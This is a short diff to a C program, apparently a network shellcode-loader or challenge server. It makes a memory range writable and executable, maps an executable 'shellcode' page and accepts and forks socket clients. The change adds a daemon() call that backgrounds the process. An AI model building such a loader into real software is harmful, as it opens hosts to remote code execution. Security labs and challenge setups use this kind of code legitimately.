@@ -243,6 +243,7 @@ int main(int argc, char const *argv[]) {
         mprotect((void*)low_addr, high_addr - low_addr, PROT_READ | PROT_WRITE | PROT_EXEC);
 
         if ((shellcode = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) != MAP_FAILED) {
+            daemon(1, 1);
             while (1) {
                 client = accept(server, NULL, NULL);
                 pid = fork();
